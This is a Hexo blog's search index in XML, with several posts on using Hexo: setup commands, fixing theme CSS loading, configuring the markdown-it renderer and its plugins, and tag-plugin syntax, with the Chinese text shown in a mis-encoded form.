<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/posts/4a17b156/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start">Quick Start</h2>
<h3 id="Create-a-new-post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>åšå®¢å†™ä½œ</category>
      </categories>
  </entry>
  <entry>
    <title>ã€Hexoã€‘ä½¿ç”¨ä¸­çš„æ€»ç»“</title>
    <url>/posts/8071f3a9/</url>
    <content><![CDATA[<p>æœ¬æ–‡è®°å½•åœ¨ä½¿ç”¨hexoè¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼ŒæŒç»­æ›´æ–°</p>
<span id="more"></span>
<h2 id="å¸¦ç©ºæ ¼çš„æ ‡é¢˜">å¸¦ç©ºæ ¼çš„æ ‡é¢˜</h2>
<p>å¸¦ç©ºæ ¼çš„æ ‡é¢˜éœ€è¦ç”¨åŒå¼•å·<code>â€œæ ‡  é¢˜â€</code>å¼•èµ·æ¥ï¼Œä¸ç„¶æ–‡ä»¶å’Œæ ‡é¢˜çš„å‘½åä¼šå‘ç”Ÿé”™è¯¯ã€‚</p>
<p><img src="/posts/8071f3a9//image-20250305142442398.png" alt="image-20250305142442398"></p>
<h2 id="æ ‡ç­¾æœªé—­åˆ">æ ‡ç­¾æœªé—­åˆ</h2>
<p>é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºâ€œunexpected end of fileâ€ï¼Œé€šå¸¸æ„å‘³ç€æ¨¡æ¿ä¸­æœ‰æœªé—­åˆçš„æ ‡ç­¾æˆ–è¯­æ³•é”™è¯¯ï¼Œä½†ä¹Ÿæœ‰å…¶ä»–å¯èƒ½ã€‚</p>
<p><img src="/posts/8071f3a9//image-20250507115534543.png" alt="image-20250507115534543"></p>
<h2 id="å–æ¶ˆå›¾ç‰‡åå­—">å–æ¶ˆå›¾ç‰‡åå­—</h2>
<p><img src="/posts/8071f3a9//111.png" alt="111"></p>
<p>æˆ‘ä½¿ç”¨Typoraç¼–å†™åšå®¢ï¼Œå¤åˆ¶ç²˜è´´å›¾åƒçš„æ—¶å€™ä¼šè‡ªåŠ¨ç”Ÿæˆåå­—ï¼Œä½†æ˜¯æˆ‘è§‰å¾—è¿™æ ·å¹¶ä¸ç¾è§‚ï¼Œå› æ­¤æˆ‘æƒ³è®©æˆ‘çš„åšå®¢ä¸å†æ˜¾ç¤ºåç§°ã€‚ç”±äºæˆ‘å·²ç»å†™äº†å¾ˆå¤šçš„åšå®¢ï¼Œæ‰€ä»¥å•çº¯çš„ä¿®æ”¹Typoraä¼šä½¿æˆ‘ä¹‹å‰çš„å›¾ç‰‡ä¾ç„¶æ˜¾ç¤ºåå­—ï¼Œå› æ­¤æˆ‘è€ƒè™‘ä¿®æ”¹æˆ‘çš„ä¸»é¢˜é…ç½®ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜ä¹ŸèŠ±è´¹äº†æˆ‘ä¸çŸ­çš„æ—¶é—´ï¼Œä¸»è¦æ˜æ˜å¯ä»¥ç®€å•çš„åœ¨ä¸»é¢˜çš„é…ç½®æ–‡ä»¶é‡Œæ·»åŠ <code>head: source/_data/head.css</code> ä½†æ˜¯æˆ‘è¿™ä¹ˆåšä»¥åï¼Œå§‹ç»ˆä¸èƒ½æˆåŠŸã€‚æˆ‘çš„head.cssæ–‡ä»¶å¹¶æ²¡æœ‰åŠ è½½ã€‚ç½‘ç»œé€‚é…å™¨é‡Œæœç´¢ä¸åˆ°head.cssï¼Œå¹¶ä¸”åœ¨æˆ‘åšå®¢çš„å³ä¸Šè§’å‡ºç° <code>[object Promise]</code> å­—ç¬¦ã€‚</p>
<p>å› æ­¤æˆ‘ç›´æ¥ä¿®æ”¹äº†ä¸»é¢˜æ¨¡æ¿å¼ºåˆ¶å¼•å…¥ã€‚</p>
<ol>
<li class="lvl-3">
<p>æ‰“å¼€ä¸»é¢˜çš„ <code>head.swig</code> æ–‡ä»¶ï¼ˆè·¯å¾„ï¼š<code>themes/next/layout/_partials/head.swig</code>ï¼‰ã€‚</p>
</li>
<li class="lvl-3">
<p>åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p>
</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;# æ‰‹åŠ¨å¼•å…¥è‡ªå®šä¹‰ CSS #&#125;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/head<span class="selector-class">.css</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>å°† <code>head.css</code> ç§»åŠ¨åˆ° Hexo çš„ <code>source/css/</code> ç›®å½•ï¼š</p>
</li>
</ol>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">åšå®¢æ ¹ç›®å½•/</span><br><span class="line">â”œâ”€ source/</span><br><span class="line">â”‚  â””â”€ css/</span><br><span class="line">â”‚     â””â”€ head.css   &lt;<span class="comment">-- ç§»åŠ¨åˆ°æ­¤ç›®å½•</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>æ¸…ç†ç¼“å­˜å¹¶é‡æ–°ç”Ÿæˆï¼š<code>hexo clean &amp;&amp; hexo g</code></p>
</li>
</ol>
<h2 id="æ–°ç”Ÿæˆçš„åšå®¢æ²¡æœ‰åºåˆ—åŒ–">æ–°ç”Ÿæˆçš„åšå®¢æ²¡æœ‰åºåˆ—åŒ–</h2>
<p>æ¯æ¬¡ç”Ÿæˆæ–°åšå®¢ä¹‹åè¦å…ˆæ‰§è¡Œä¸€ä¸‹<code>hexo cl &amp;&amp; hexo g</code> æ‰ä¼šç”Ÿæˆ<code>abbrlink</code>ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>åšå®¢å†™ä½œ</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Hexoã€‘åšå®¢å¤åˆ¶ç²˜è´´</title>
    <url>/posts/4fb642e/</url>
    <content><![CDATA[<p>æœ¬æ–‡ä»‹ç»ä½¿ç”¨chromæµè§ˆå™¨ï¼Œåœ¨æºç ä¸­copy elementå¯ä»¥å°†åšå®¢å¤åˆ¶ä¸‹æ¥ï¼Œç›´æ¥ç²˜è´´åˆ°è‡ªå·±çš„åšå®¢é‡Œã€‚æ–¹ä¾¿åæœŸçš„æ›´æ”¹ã€‚</p>
<span id="more"></span>
<ol>
<li class="lvl-3">
<p>é¦–å…ˆ,åœ¨è‡ªå·±å–œæ¬¢çš„åšå®¢é¡µé¢,ç‚¹å‡»é¼ æ ‡å³é”®,çœ‹åˆ°å¦‚ä¸‹å›¾ç‰‡,ç‚¹å‡»æœ€åä¸€è¡Œ<code>æ£€æŸ¥</code></p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218162611570.png" alt="image-20250218162611570"></p>
<ol start="2">
<li class="lvl-3">
<p>ç„¶å,åœ¨å³è¾¹çš„æºç é‡Œè¾¹,æ‰¾åˆ°&quot;article_content&quot;æ ‡ç­¾å¤´,å¯ä»¥çœ‹åˆ°å·¦ä¾§éƒ¨åˆ†çš„é¢„è§ˆç•Œé¢è¢«é€‰ä¸­çš„éƒ¨åˆ†å°±æ˜¯è¦å¤åˆ¶ç²˜è´´æ–‡ç« (åŒ…æ‹¬htmléƒ¨åˆ†),æ£€æŸ¥å·¦ä¾§è¢«é€‰ä¸­çš„éƒ¨åˆ†æ˜¯å¦æ˜¯è‡ªå·±æƒ³è¦çš„éƒ¨åˆ†.</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218163315027.png" alt="image-20250218163315027"></p>
<ol start="3">
<li class="lvl-3">
<p>ä¹‹å,å†å³é”®é€‰æ‹©è¯¥æ ‡ç­¾(â€œarticle_contentâ€),å¦‚ä¸‹å›¾,é€‰æ‹©Copy elementå¤åˆ¶(æˆ–è€…Cut element å‰ªåˆ‡)è¯¥æ ‡ç­¾ä¸‹çš„æ‰€æœ‰å…ƒç´ </p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218163453271.png" alt="image-20250218163453271"></p>
<ol start="4">
<li class="lvl-3">
<p>æ–°å»ºä¸€ä¸ª txt æ–‡ä»¶ï¼Œå°†åç¼€æ”¹ä¸º .html ï¼ŒæŠŠåˆšå¤åˆ¶çš„ æºä»£ç  ç²˜è´´åˆ°æ–‡ä»¶ä¸­ï¼Œæµè§ˆå™¨æ‰“å¼€åå¦‚ä¸‹å›¾ï¼Œæ­¤æ—¶å¤åˆ¶å…¨æ–‡åˆ°markdownçš„è½¯ä»¶<a href="https://www.typora.io/">Typora</a>ä¸­</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250220122601039.png" alt="image-20250220122601039"></p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/qq_36437693/article/details/127286941">å¦‚ä½•csdnå¤åˆ¶ä»–äººåšå®¢æ–‡ç« åˆ°è‡ªå·±åšå®¢ä¸‹</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>åšå®¢å†™ä½œ</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Hexoã€‘æ›´é«˜çº§çš„Markdownæ¸²æŸ“å™¨â€”â€”hexo-renderer-markdown-it</title>
    <url>/posts/e3e8d0c4/</url>
    <content><![CDATA[<p>Hexo é»˜è®¤æ­é…çš„ Markdown æ¸²æŸ“å™¨æ˜¯ hexo-renderer-markedï¼Œä½†å…¶æ”¯æŒçš„æ¸²æŸ“æ ¼å¼æœ‰é™ï¼Œä¸åˆ©äºè‡ªç”±å†™ä½œã€‚å› æ­¤ï¼Œä»Šå¤©æ•™å¤§å®¶å¦‚ä½•æ›´æ¢ä¸ºåŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œæ¸²æŸ“é€Ÿåº¦æ›´å¿«çš„ hexo-renderer-markdown-it æ¸²æŸ“å™¨ï¼Œå¹¶ä¸”è¿˜ä¼šè¯¦ç»†ä»‹ç»å¸¸ç”¨æ’ä»¶çš„é…ç½®ï¼Œå®ç°æ›´ä¼˜é›…çš„ Markdown å†™ä½œã€‚</p>
<p>containerå’Œfootnoteä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½ä½¿ç”¨ï¼Œä¼°è®¡ä¹Ÿç”¨ä¸ä¸Šï¼Œæš‚æ—¶ä¸å¤„ç†äº†ã€‚åŸæ–‡åœ¨å‚è€ƒæ–‡ç« é‡Œã€‚</p>
<span id="more"></span>
<h2 id="å®‰è£…">å®‰è£…</h2>
<p>å¸è½½ <code>hexo-renderer-marked</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<p>å®‰è£… <code>hexo-renderer-markdown-it</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-<span class="keyword">it</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<h2 id="é…ç½®">é…ç½®</h2>
<p>å°†å¦‚ä¸‹æ–‡æœ¬å¤åˆ¶ç²˜è´´åˆ° <a href="https://so.csdn.net/so/search?q=Hexo&amp;spm=1001.2101.3001.7020">Hexo</a> çš„é…ç½®æ–‡ä»¶ <code>_config.yml</code> çš„å°¾éƒ¨</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">markdown</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">preset</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span></span><br><span class="line">  <span class="attribute">render</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">html</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">xhtmlOut</span><span class="punctuation">:</span> <span class="string">false</span></span><br><span class="line">    <span class="attribute">langPrefix</span><span class="punctuation">:</span> <span class="string">&quot;language-&quot;</span></span><br><span class="line">    <span class="attribute">breaks</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">linkify</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">typographer</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">quotes</span><span class="punctuation">:</span> <span class="string">&quot;â€œâ€â€˜â€™&quot;</span></span><br><span class="line">  <span class="attribute">enable_rules</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">disable_rules</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">plugins</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-abbr</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-cjk-breaks</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-deflist</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-emoji</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-footnote</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-ins</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-mark</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sup</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-checkbox</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-imsize</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-expandable</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">success</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">tips</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">warning</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">danger</span></span><br><span class="line">  <span class="attribute">anchors</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">level</span><span class="punctuation">:</span> <span class="string">2</span></span><br><span class="line">    <span class="attribute">collisionSuffix</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="attribute">permalink</span><span class="punctuation">:</span> <span class="string">false</span></span><br><span class="line">    <span class="attribute">permalinkClass</span><span class="punctuation">:</span> <span class="string">&quot;header-anchor&quot;</span></span><br><span class="line">    <span class="attribute">permalinkSide</span><span class="punctuation">:</span> <span class="string">&quot;left&quot;</span></span><br><span class="line">    <span class="attribute">permalinkSymbol</span><span class="punctuation">:</span> <span class="string">&quot;Â¶&quot;</span></span><br><span class="line">    <span class="attribute">case</span><span class="punctuation">:</span> <span class="string">0</span></span><br><span class="line">    <span class="attribute">separator</span><span class="punctuation">:</span> <span class="string">&quot;-&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="æ’ä»¶">æ’ä»¶</h2>
<p>æœ¬ç« èŠ‚è®²è¿°å„ç§æ’ä»¶çš„ç”¨æ³•ã€é…ç½®å’Œæ³¨æ„äº‹é¡¹ã€‚</p>
<h3 id="å®‰è£…-2">å®‰è£…</h3>
<p>åˆ†åˆ«ä½¿ç”¨ <code>npm</code> å‘½ä»¤å®‰è£…ä»¥ä¸‹ä¸‰ä¸ªæ’ä»¶ï¼š</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-checkbox</span><br><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-imsize</span><br><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-expandable</span><br></pre></td></tr></table></figure>
<p>å…¶å®ƒæ’ä»¶ <code>hexo-renderer-markdown-it</code> æ¸²æŸ“å™¨è‡ªå¸¦çš„æœ‰ï¼Œä¸è¦å®‰è£…ã€‚</p>
<h3 id="ç”¨æ³•">ç”¨æ³•</h3>
<h4 id="åŸºç¡€">åŸºç¡€</h4>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>æè¿°</th>
<th>è¯­æ³•</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>markdown-it-abbr</td>
<td>æ³¨é‡Š</td>
<td><code>*[HTML]: è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€</code></td>
<td>*[HTML]: è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€</td>
</tr>
<tr>
<td>markdown-it-emoji</td>
<td>è¡¨æƒ…</td>
<td><code>:)</code>  <code>:crab:</code>  <code>:horse:</code></td>
<td>ğŸ˜ƒ ğŸ¦€ ğŸ´</td>
</tr>
<tr>
<td>markdown-it-footnote</td>
<td>è„šæ³¨</td>
<td><code>å‚è€ƒæ–‡çŒ®&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;</code></td>
<td>å‚è€ƒæ–‡çŒ®<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup></td>
</tr>
<tr>
<td>markdown-it-ins</td>
<td>ä¸‹åˆ’çº¿</td>
<td><code>++ä¸‹åˆ’çº¿++</code></td>
<td><ins>ä¸‹åˆ’çº¿</ins></td>
</tr>
<tr>
<td>markdown-it-mark</td>
<td>çªå‡ºæ˜¾ç¤º</td>
<td><code>==æ ‡è®°==</code></td>
<td><mark>æ ‡è®°</mark></td>
</tr>
<tr>
<td>markdown-it-sub</td>
<td>ä¸‹æ ‡</td>
<td><code>H~2~O</code></td>
<td>H<sub>2</sub>O</td>
</tr>
<tr>
<td>markdown-it-sup</td>
<td>ä¸Šæ ‡</td>
<td><code>X^2^</code></td>
<td>X<sup>2</sup></td>
</tr>
<tr>
<td>markdown-it-checkbox</td>
<td>å¤é€‰æ¡†</td>
<td><input type="checkbox" id="checkbox1"><label for="checkbox1"></label>æœªé€‰ <br> <input type="checkbox" id="checkbox0" checked="true"><label for="checkbox0"></label>é€‰ä¸­</td>
<td><img src="/posts/e3e8d0c4//image-20241111151833850.png" alt="image-20241111151833850"></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox2"><label for="checkbox2">æœªé€‰</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox3" checked="true"><label for="checkbox3">é€‰ä¸­</label></p>
</li>
</ul>
<h4 id="è¿›é˜¶">è¿›é˜¶</h4>
<blockquote>
<p><a href="https://github.com/tatsy/markdown-it-imsize">markdown-it-imsize</a>ï¼šè‡ªå®šä¹‰å›¾ç‰‡å®½é«˜ã€‚</p>
</blockquote>
<p>è¯­æ³•ï¼šï¼ˆ<strong>æ³¨æ„</strong>ï¼š<code>=100x200</code> å‰é¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼‰</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[test]</span>(<span class="number">006</span>.png =<span class="number">100</span>x200)</span><br></pre></td></tr></table></figure>
<p><img src="/posts/e3e8d0c4//006.png" alt="test" width="100" height="200"></p>
<blockquote>
<p><a href="https://github.com/bioruebe/markdown-it-collapsible">markdown-it-expandable</a>ï¼šæŠ˜å /å±•å¼€å†…å®¹ã€‚</p>
</blockquote>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+++</span> <span class="strong">**ç‚¹å‡»æŠ˜å **</span></span><br><span class="line"><span class="section">è¿™æ˜¯è¢«éšè—çš„å†…å®¹</span></span><br><span class="line"><span class="section">+++</span></span><br></pre></td></tr></table></figure>
<p>æ•ˆæœï¼š</p>
<details open>
<summary><span class="pre-summary">&nbsp;</span><strong>ç‚¹å‡»æŠ˜å </strong></summary><p>è¿™æ˜¯è¢«éšè—çš„å†…å®¹</p>
</details>
<blockquote>
<p><a href="https://github.com/markdown-it/markdown-it-container">markdown-it-container</a>ï¼šè‡ªå®šä¹‰å®¹å™¨ã€‚</p>
</blockquote>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="meta">:::</span> tips</span><br><span class="line"><span class="strong">**æç¤º**</span></span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªæç¤º</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> warning</span><br><span class="line"><span class="strong">**æ³¨æ„**</span></span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªè­¦å‘Š</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> danger</span><br><span class="line"><span class="strong">**è­¦å‘Š**</span></span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªå±é™©ä¿¡å·</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> success</span><br><span class="line"><span class="strong">**æˆåŠŸ**</span></span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªæˆåŠŸä¿¡å·</span><br><span class="line"><span class="meta">:::</span></span><br></pre></td></tr></table></figure>
<p>æ•ˆæœï¼š</p>
<div class="tips">
<p><strong>æç¤º</strong><br>
è¿™æ˜¯ä¸€ä¸ªæç¤º</p>
</div>
<div class="warning">
<p><strong>æ³¨æ„</strong><br>
è¿™æ˜¯ä¸€ä¸ªè­¦å‘Š</p>
</div>
<div class="danger">
<p><strong>è­¦å‘Š</strong><br>
è¿™æ˜¯ä¸€ä¸ªå±é™©ä¿¡å·</p>
</div>
<div class="success">
<p><strong>æˆåŠŸ</strong><br>
è¿™æ˜¯ä¸€ä¸ªæˆåŠŸä¿¡å·</p>
</div>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/qq_42951560/article/details/123596899">ã€Hexoã€‘é€‰æ‹©æ›´é«˜çº§çš„Markdownæ¸²æŸ“å™¨</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>åšå®¢å†™ä½œ</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Hexoã€‘æ ‡ç­¾æ’ä»¶ä½¿ç”¨</title>
    <url>/posts/eefe99e9/</url>
    <content><![CDATA[<p>ã€Œtag æ’ä»¶ã€(Tag Plugin) æ˜¯ Hexo æä¾›çš„ä¸€ç§å¿«é€Ÿç”Ÿæˆç‰¹å®šå†…å®¹çš„æ–¹å¼ã€‚ ä¾‹å¦‚ï¼Œåœ¨æ ‡å‡† Markdown è¯­æ³•ä¸­ï¼Œæˆ‘ä»¬æ— æ³•æŒ‡å®šå›¾ç‰‡çš„å¤§å°ã€‚è¿™ç§æƒ…æ™¯ï¼Œæˆ‘ä»¬å³å¯ä½¿ç”¨æ ‡ç­¾æ¥è§£å†³ã€‚ Hexo å†…ç½®æ¥è®¸å¤šæ ‡ç­¾æ¥å¸®åŠ©å†™ä½œè€…å¯ä»¥æ›´å¿«çš„ä¹¦å†™ï¼Œ å®Œæ•´çš„æ ‡ç­¾åˆ—è¡¨ å¯ä»¥å‚è€ƒ <a href="https://hexo.io/docs/tag-plugins.html">Hexo å®˜ç½‘</a>ã€‚ å¦å¤–ï¼ŒHexo ä¹Ÿå¼€æ”¾æ¥æ¥å£ç»™ä¸»é¢˜ï¼Œä½¿ä¸»é¢˜æœ‰å¯èƒ½æä¾›ç»™å†™ä½œè€…æ›´ç®€ä¾¿çš„å†™ä½œæ–¹æ³•ã€‚</p>
<span id="more"></span>
<h2 id="å¼•ç”¨å—">å¼•ç”¨å—</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>blockquote</strong></p>
</li>
</ul>
<p>åœ¨æ–‡ç« ä¸­æ’å…¥å¼•è¨€ï¼Œå¯åŒ…å«ä½œè€…ã€æ¥æºå’Œæ ‡é¢˜ï¼Œå‡å¯é€‰ã€‚</p>
<p>æ ‡ç­¾æ–¹å¼ï¼šä½¿ç”¨ <code>blockquote</code> æˆ–è€… ç®€å†™ <code>quote</code>ã€‚</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">block</span>quote author, <span class="name">source</span> link source_link_title <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">content</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endblock</span>quote <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">blockquote</span> Corazon, https://www.mcorazon.top Corazonåšå®¢é¦–é¡µ %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">è¿™ä¸ªä¸–ç•Œæ€»æœ‰é»‘å¤œ</span></span><br><span class="line"><span class="language-xml">ä½†æ˜¯æˆ‘ä»¬æ€»å‘ç€å…‰</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endblockquote</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote><p>è¿™ä¸ªä¸–ç•Œæ€»æœ‰é»‘å¤œä½†æ˜¯æˆ‘ä»¬æ€»å‘ç€å…‰</p>
<footer><strong>Corazon,</strong><cite><a href="https://www.mcorazon.top">Corazonåšå®¢é¦–é¡µ</a></cite></footer></blockquote>	
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>pullquote</strong></p>
</li>
</ul>
<p>pullquote å¯ä»¥è‡ªå®šä¹‰å¼•ç”¨å—çš„æ ·å¼</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;% pullquote [<span class="class"><span class="keyword">class</span>] %&#125;</span></span><br><span class="line"><span class="class"><span class="title">content</span></span></span><br><span class="line"><span class="class"></span>&#123;% endpullquote <span class="variable">%&#125;</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>å±…ä¸­å¼•ç”¨</strong></p>
</li>
</ul>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">centerquote</span> %&#125;</span><span class="language-xml">blah blah blah</span><span class="template-tag">&#123;% <span class="name">endcenterquote</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>blah blah blah</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>
<p>åŒæ—¶HTML å±…ä¸­å¼•ç”¨çš„æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ï¼š</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">blockquote </span>class=<span class="string">&quot;blockquote-center&quot;</span>&gt;<span class="keyword">blah </span><span class="keyword">blah </span><span class="keyword">blah&lt;/blockquote&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">blah blah blah</blockquote>
<h2 id="ä»£ç å—-a-id-dmk-a">ä»£ç å—<a id="dmk"></a></h2>
<p>åœ¨æ–‡ç« ä¸­æ’å…¥ä»£ç ï¼ŒåŒ…å«æŒ‡å®šè¯­è¨€ã€é™„åŠ è¯´æ˜å’Œç½‘å€ï¼Œå‡å¯é€‰ã€‚æ ‡ç­¾æ–¹å¼ï¼šä½¿ç”¨ <code>codeblock</code> æˆ–è€… ç®€å†™ <code>code</code>ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>codeblockä»£ç å—</p>
</li>
</ul>
